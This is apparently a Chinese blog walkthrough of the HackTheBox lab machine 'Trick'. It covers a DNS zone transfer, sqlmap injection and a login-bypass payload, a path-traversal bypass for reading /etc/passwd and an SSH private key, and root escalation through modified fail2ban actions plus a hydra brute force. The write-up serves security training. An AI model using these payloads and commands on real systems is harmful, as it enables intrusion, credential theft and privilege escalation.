<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lYUYVYeqONJH4WYFN5kQqQ)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 110篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUugfcmhRRO2Cm9qMJ3llghAu4tGxzQgIcRsAbiaYRvX87t2ujS9BX4v0GAhZG3COE2TAaw09m1WGhg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

靶机信息
----

靶机地址:

```
https://app.hackthebox.com/machines/Trick
```

靶场: HackTheBox.com

靶机名称: Trick

难度: 简单

提示信息:

```
无
```

目标: user.txt和root.txt

  

实验环境
----

```
攻击机:Vbox Manjaro 10.10.14.92  
  
靶机:10.129.116.123
```

  

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -p- -v 10.10.11.148
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
sudo nmap -sC -sV -p22,25,53,80 10.129.116.123 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫描到22、25、53和80端口开放，先来看看80端口

Web渗透
-----

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后提示是一个正在开发的网站，有个提交EMAIL地址的表单，先来做个目录扫描

```
sudo dirsearch -u http://10.129.116.123 -w ~/HackTools/Dict/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

目录扫描未发现可利用信息，再来试试其他端口

域名暴破
----

主机开放53端口猜测需要绑定域名，可能还有子域名，来验证下。（htb的靶机多数都会用到靶机名称加htb为域名，这里用trick.htb检测）

```
这里涉及dig命令的一个重要的参数axfr:  
axfr 是q-type类型的一种: axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。  
只要欺骗dns服务器发送一个axfr请求过去，　如果该dns服务器上存在该漏洞，就会返回所有的解析记录值
```

```
dig axfr trick.htb @10.129.116.123
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现子域名，绑定后访问

```
sudo nano /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
http://preprod-payroll.trick.htb
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后直接跳转登录页面，来试试是否存在SQL注入

```
sqlmap -u 'http://preprod-payroll.trick.htb:80/ajax.php?action=login' --data='username=admin&password=123123' --cookie='PHPSESSID=ulgdquht70s2snbinc7v6gqml6'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在使用sqlmap注入期间，手动使用万能密码检测时登录成功

```
admin ' or 1=1 -- -
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在用户管理中获取到管理员Enemigosss的密码，刚刚通过sql注入登录到后台那就继续检查其他参数是否存在注入点

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过burpsuite抓包在每个POST提交中都进行SQL注入检测，在Employee List模块中的添加员工里发现注入口

检测是否存在漏洞

```
sqlmap -u 'http://preprod-payroll.trick.htb:80/ajax.php?action=save_employee' --data='id=&firstname=sdf&middlename=sdf&lastname=sdf&department_id=2&position_id=2&salary=' --cookie='PHPSESSID=ulgdquht70s2snbinc7v6gqml6' --batch
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现漏洞暴库名

```
sqlmap -u 'http://preprod-payroll.trick.htb:80/ajax.php?action=save_employee' --data='id=&firstname=sdf&middlename=sdf&lastname=sdf&department_id=2&position_id=2&salary=' --cookie='PHPSESSID=ulgdquht70s2snbinc7v6gqml6' --dbs
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到数据库名，尝试枚举数据库账号

```
sqlmap -u 'http://preprod-payroll.trick.htb:80/ajax.php?action=save_employee' --data='id=&firstname=sdf&middlename=sdf&lastname=sdf&department_id=2&position_id=2&salary=' --cookie='PHPSESSID=ulgdquht70s2snbinc7v6gqml6' --batch --dbms mysql --users
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

尝试读取文件

```
sqlmap -u 'http://preprod-payroll.trick.htb:80/ajax.php?action=save_employee' --data='id=&firstname=sdf&middlename=sdf&lastname=sdf&department_id=2&position_id=2&salary=' --cookie='PHPSESSID=ulgdquht70s2snbinc7v6gqml6' --batch --dbms mysql --file-read=/etc/passwd
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

等了十几个小时终于跑完了，来看看内容

```
cat ~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

文件太大读取失败，尝试读取nginx配置文件

```
sqlmap -u 'http://preprod-payroll.trick.htb:80/ajax.php?action=save_employee' --data='id=&firstname=sdf&middlename=sdf&lastname=sdf&department_id=2&position_id=2&salary=' --cookie='PHPSESSID=ulgdquht70s2snbinc7v6gqml6' --batch --dbms mysql --file-read=/etc/nginx/nginx.conf
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

文件读取不完整，但是也看到了站点配置文件路径在默认路径中，尝试读取默认站点配置文件

```
sqlmap -u 'http://preprod-payroll.trick.htb:80/ajax.php?action=save_employee' --data='id=&firstname=sdf&middlename=sdf&lastname=sdf&department_id=2&position_id=2&salary=' --cookie='PHPSESSID=ulgdquht70s2snbinc7v6gqml6' --batch --dbms mysql --file-read=/etc/nginx/sites-available/default
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

下载完成，来看看内容

```
cat /home/m/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

配置文件中显示提供3个web服务，并且发现另一个域名preprod-marketing.trick.htb和网站文件存放目录，绑定域名并访问

```
sudo nano /etc/hosts
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

访问后检查下每个链接，发现services、about、contac三个链接的url为http://preprod-marketing.trick.htb/index.php?page=services.html看后面的services.html猜测这里存在文件包含漏洞，验证一下

```
http://preprod-marketing.trick.htb/index.php?page=../../../../../../etc/passwd
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

随手检查下发现无法访问，再次通过SQL注入读取index.php这个文件的源码

```
sqlmap -u 'http://preprod-payroll.trick.htb:80/ajax.php?action=save_employee' --data='id=&firstname=sdf&middlename=sdf&lastname=sdf&department_id=2&position_id=2&salary=' --cookie='PHPSESSID=ulgdquht70s2snbinc7v6gqml6' --batch --dbms mysql --file-read=/var/www/market/index.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
cat /home/m/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

查看源码发现过滤../但是只有一次，使用..././来绕过

```
http://preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

读取成功，发现普通用户michael，配合前面拿到的密码试试能不能登录SSH

```
ssh michael@trick.htb
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录失败，继续读取敏感信息

```
http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

读取到用户证书，检查是否可以证书登录

```
http://preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/authorized_keys
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现authorized_keys文件，使用证书登录SSH

```
ssh michael@trick.htb -i id_rsa
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

登录成功，来找找敏感信息

```
ls  
cat user.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到user.txt，继续找

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现可以使用root身份重启fail2ban，来看看如何利用

```
简单介绍下fail2ban这个命令的功能：  
当fail2ban服务启动后会监控SSH登录信息，如果攻击者暴破服务器上的SSH用户，fail2ban命令触发防火墙禁用攻击者的IP以防止暴破用户密码。
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

文章中提到通过修改iptables-multiport.conf配置文件加入恶意命令，并使用ssh暴破工具触发fail2ban执行配置文件中的命令，来验证一下

检查文件是否有权限修改

```
cd /etc/fail2ban/action.d/  
ls -al iptables-multiport.conf  
cd ..  
ls -al action.d
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

检查后发现文件没有修改权限，但是当前目录下有一个security组有权限，来看看michael是否在这个组中

```
id
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

michael用户有权限，直接来修改配置文件

1。修改配置文件

```
nano action.d/iptables-multiport.conf
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过修改actionban和actionunban两处添加chmod u+s /bin/bash命令，注意保存配置文件时需要强制保存，当服务器被暴力破解SSH时便会触发chmod命令，使bash文件加上s权限。在修改文件时发现每隔一段时间action.d目录下的文件会被删除并恢复原来的文件，这样就需要快速操作在保存配置文件的同时攻击SSH服务。

2。重启fail2ban让配置文件生效

```
sudo /etc/init.d/fail2ban restart
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

3。暴破SSH

```
hydra -l root -P ../../Dict/rockyou.txt ssh://trick.htb  
ls -al /bin/bash  
bash -p
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

经过多次操作bash被加上s权限，执行提权后虽然还是michael用户但是已经加入到root组了，来找下flag

```
cat /root/root.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)